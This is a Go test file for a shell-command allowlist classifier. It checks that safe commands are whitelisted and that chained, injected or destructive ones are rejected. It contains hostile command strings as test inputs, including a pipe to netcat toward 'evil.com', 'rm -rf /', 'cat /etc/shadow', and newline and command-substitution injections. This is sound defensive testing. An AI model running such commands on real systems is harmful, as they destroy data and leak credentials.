package main

import "testing"

// TestClassifyExactWhitelisted verifies that exact-match whitelisted commands
// (both bare commands and full commands with specific arguments) are classified
// as "whitelisted".
func TestClassifyExactWhitelisted(t *testing.T) {
	cases := []struct {
		cmd  string
		name string
	}{
		// Bare commands.
		{"pwd", "bare pwd"},
		{"date", "bare date"},
		{"whoami", "bare whoami"},
		{"env", "bare env"},
		{"id", "bare id"},
		{"ip -4 -o addr show eth1 | awk '{print $4}'", "ip addr with awk"},
		{"uptime", "bare uptime"},
		{"df", "bare df"},
		{"free", "bare free"},
		{"ps", "bare ps"},
		{"history", "bare history"},
		{"  ps  ", "ps with surrounding spaces"},
		// Full commands with specific arguments.
		{"home-manager switch --rollback", "home-manager rollback"},
		{"home-manager generations", "home-manager generations"},
		{`nix develop --command sh -c "figlet 'Nix' | cowsay -n | lolcat -f"`, "nix develop figlet cowsay lolcat"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := classifyCommand(tc.cmd)
			if got != "whitelisted" {
				t.Errorf("classifyCommand(%q) = %q, want %q", tc.cmd, got, "whitelisted")
			}
		})
	}
}

// TestClassifyPrefixWhitelisted verifies that prefix-whitelisted commands are
// classified as "whitelisted" when invoked bare or with arguments and no shell metacharacters.
func TestClassifyPrefixWhitelisted(t *testing.T) {
	cases := []struct {
		cmd  string
		name string
	}{
		{"tree", "bare tree"},
		{"ls", "bare ls"},
		{"ls -la", "ls with flags"},
		{"ls -la /tmp", "ls with flags and path"},
		{"uname", "bare uname"},
		{"uname -a", "uname with flag"},
		{"cat README.md", "cat with file"},
		{"cat /etc/passwd", "cat with path"},
		{"head -n 10 file.txt", "head with args"},
		{"tail -f log.txt", "tail with args"},
		{"grep foo bar.txt", "grep with args"},
		{"cd /tmp", "cd with path"},
		{"echo hello", "echo with args"},
		{"echo hello world", "echo with multiple args"},
		{"wc -l file.txt", "wc with args"},
		{"file README.md", "file with arg"},
		{"du -sh .", "du with args"},
		{"stat file.txt", "stat with arg"},
		{"realpath .", "realpath with arg"},
		{"printf '%s\\n' hello", "printf with args"},
		{"which pokemonsay", "which pokemonsay"},
		{"which ls", "which ls"},
		{"  ls -la  ", "ls with surrounding spaces"},
		{"  which cowsay  ", "which cowsay with spaces"},
		{"tree .", "tree with path"},
		{"tree /tmp", "tree with absolute path"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := classifyCommand(tc.cmd)
			if got != "whitelisted" {
				t.Errorf("classifyCommand(%q) = %q, want %q", tc.cmd, got, "whitelisted")
			}
		})
	}
}

// TestClassifyPrefixWithMetachars verifies that prefix-whitelisted commands containing
// shell metacharacters are classified as "unclassified".
func TestClassifyPrefixWithMetachars(t *testing.T) {
	cases := []struct {
		cmd  string
		name string
	}{
		{"cat /etc/passwd; rm -rf /", "cat with semicolon chaining"},
		{"echo hello | nc evil.com 1234", "echo with pipe"},
		{"ls && rm -rf /", "ls with ampersand chaining"},
		{"grep foo bar.txt > /tmp/out", "grep with redirect"},
		{"cat file `whoami`", "cat with backtick"},
		{"echo $(id)", "echo with command substitution"},
		{"which foo; rm -rf /", "which with semicolon chaining"},
		{"which foo && echo pwned", "which with ampersand chaining"},
		{"which foo | cat", "which with pipe"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := classifyCommand(tc.cmd)
			if got != "unclassified" {
				t.Errorf("classifyCommand(%q) = %q, want %q", tc.cmd, got, "unclassified")
			}
		})
	}
}

// TestClassifyExactWhitelistedVariation verifies that variations of exact whitelisted
// commands with different arguments are classified as "unclassified".
func TestClassifyExactWhitelistedVariation(t *testing.T) {
	cases := []struct {
		cmd  string
		name string
	}{
		{"home-manager switch", "home-manager switch without rollback"},
		{"home-manager switch --rollback; rm -rf /", "rollback with chained command"},
		{"home-manager generations --json", "generations with extra args"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := classifyCommand(tc.cmd)
			if got != "unclassified" {
				t.Errorf("classifyCommand(%q) = %q, want %q", tc.cmd, got, "unclassified")
			}
		})
	}
}

// TestClassifyWhitelistedWithSurroundingSpaces verifies that leading and trailing
// whitespace is ignored when matching whitelisted commands.
func TestClassifyWhitelistedWithSurroundingSpaces(t *testing.T) {
	cases := []struct {
		cmd  string
		name string
	}{
		{"  ls  ", "ls with spaces"},
		{"\tpwd\n", "pwd with tabs and newlines"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := classifyCommand(tc.cmd)
			if got != "whitelisted" {
				t.Errorf("classifyCommand(%q) = %q, want %q", tc.cmd, got, "whitelisted")
			}
		})
	}
}

// TestClassifyBareWhitelistedWithArgs verifies that bare-only whitelisted commands
// with arguments are classified as "unclassified" because arguments can be abused.
func TestClassifyBareWhitelistedWithArgs(t *testing.T) {
	cases := []struct {
		cmd  string
		name string
	}{
		{"env FOO=bar", "env with assignment"},
		{"df -h", "df with flag"},
		{"free -m", "free with flag"},
		{"ps aux", "ps with flags"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := classifyCommand(tc.cmd)
			if got != "unclassified" {
				t.Errorf("classifyCommand(%q) = %q, want %q", tc.cmd, got, "unclassified")
			}
		})
	}
}

// TestClassifyUnclassified verifies that commands not in the whitelist
// are classified as "unclassified".
func TestClassifyUnclassified(t *testing.T) {
	cases := []struct {
		cmd  string
		name string
	}{
		{"rm -rf /", "rm command"},
		{"apt-get install vim", "apt-get command"},
		{"curl https://example.com", "curl command"},
		{"python3 script.py", "python3 command"},
		{"go build ./...", "go command"},
		{"docker run hello", "docker command"},
		{"make all", "make command"},
		{"ssh user@host", "ssh command"},
		{"find . -name '*.go'", "find command"},
		{"find / -delete", "find with delete"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := classifyCommand(tc.cmd)
			if got != "unclassified" {
				t.Errorf("classifyCommand(%q) = %q, want %q", tc.cmd, got, "unclassified")
			}
		})
	}
}

// TestClassifyNixRunWhitelisted verifies that nix run nixpkgs# commands
// are classified as "whitelisted" when they contain no shell metacharacters.
func TestClassifyNixRunWhitelisted(t *testing.T) {
	cases := []struct {
		cmd  string
		name string
	}{
		{"nix run nixpkgs#hello", "bare nix run nixpkgs"},
		{"nix run nixpkgs#jq -- --help", "nix run with trailing args"},
		{"  nix run nixpkgs#hello  ", "nix run with surrounding spaces"},
		{"nix run nixpkgs#pokemonsay 'Nix'", "nix run pokemonsay with arg"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := classifyCommand(tc.cmd)
			if got != "whitelisted" {
				t.Errorf("classifyCommand(%q) = %q, want %q", tc.cmd, got, "whitelisted")
			}
		})
	}
}

// TestClassifyNixRunUnclassified verifies that nix run commands targeting non-nixpkgs
// flake refs or containing shell metacharacters are classified as "unclassified".
func TestClassifyNixRunUnclassified(t *testing.T) {
	cases := []struct {
		cmd  string
		name string
	}{
		{"nix run github:user/repo#pkg", "non-nixpkgs flake ref"},
		{"nix run nixpkgs#hello; rm -rf /", "semicolon chaining"},
		{"nix run nixpkgs#hello && echo pwned", "ampersand chaining"},
		{"nix run nixpkgs#hello | cat", "pipe operator"},
		{"nix run nixpkgs#$(echo evil)", "command substitution dollar"},
		{"nix run nixpkgs#`echo evil`", "command substitution backtick"},
		{"nix run nixpkgs#hello\nrm -rf /", "newline injection"},
		{"nix run nixpkgs#hello\recho pwned", "carriage return injection"},
		{"nix run nixpkgs#hello > /tmp/output", "redirect output"},
		{"nix run nixpkgs#hello < /etc/passwd", "redirect input"},
		{"nix run nixpkgs#hello >> /tmp/output", "redirect append"},
		{"nix run nixpkgs#hello\techo pwned", "tab injection"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := classifyCommand(tc.cmd)
			if got != "unclassified" {
				t.Errorf("classifyCommand(%q) = %q, want %q", tc.cmd, got, "unclassified")
			}
		})
	}
}

// TestClassifyChainedCommands verifies that chained commands using shell operators
// are classified as "unclassified" because the full string does not match a bare command.
func TestClassifyChainedCommands(t *testing.T) {
	cases := []struct {
		cmd  string
		name string
	}{
		{"ls && rm -rf /", "ls chained with rm"},
		{"pwd; cat /etc/shadow", "pwd chained with cat"},
		{"ls | xargs rm", "ls piped to rm"},
		{"date || echo pwned", "date chained with echo"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := classifyCommand(tc.cmd)
			if got != "unclassified" {
				t.Errorf("classifyCommand(%q) = %q, want %q", tc.cmd, got, "unclassified")
			}
		})
	}
}

// TestClassifyEmptyCommand verifies that an empty command string
// is classified as "unclassified".
func TestClassifyEmptyCommand(t *testing.T) {
	got := classifyCommand("")
	if got != "unclassified" {
		t.Errorf("classifyCommand(%q) = %q, want %q", "", got, "unclassified")
	}
}

// TestClassifyWhitespaceOnly verifies that a whitespace-only command string
// is classified as "unclassified".
func TestClassifyWhitespaceOnly(t *testing.T) {
	got := classifyCommand("   ")
	if got != "unclassified" {
		t.Errorf("classifyCommand(%q) = %q, want %q", "   ", got, "unclassified")
	}
}
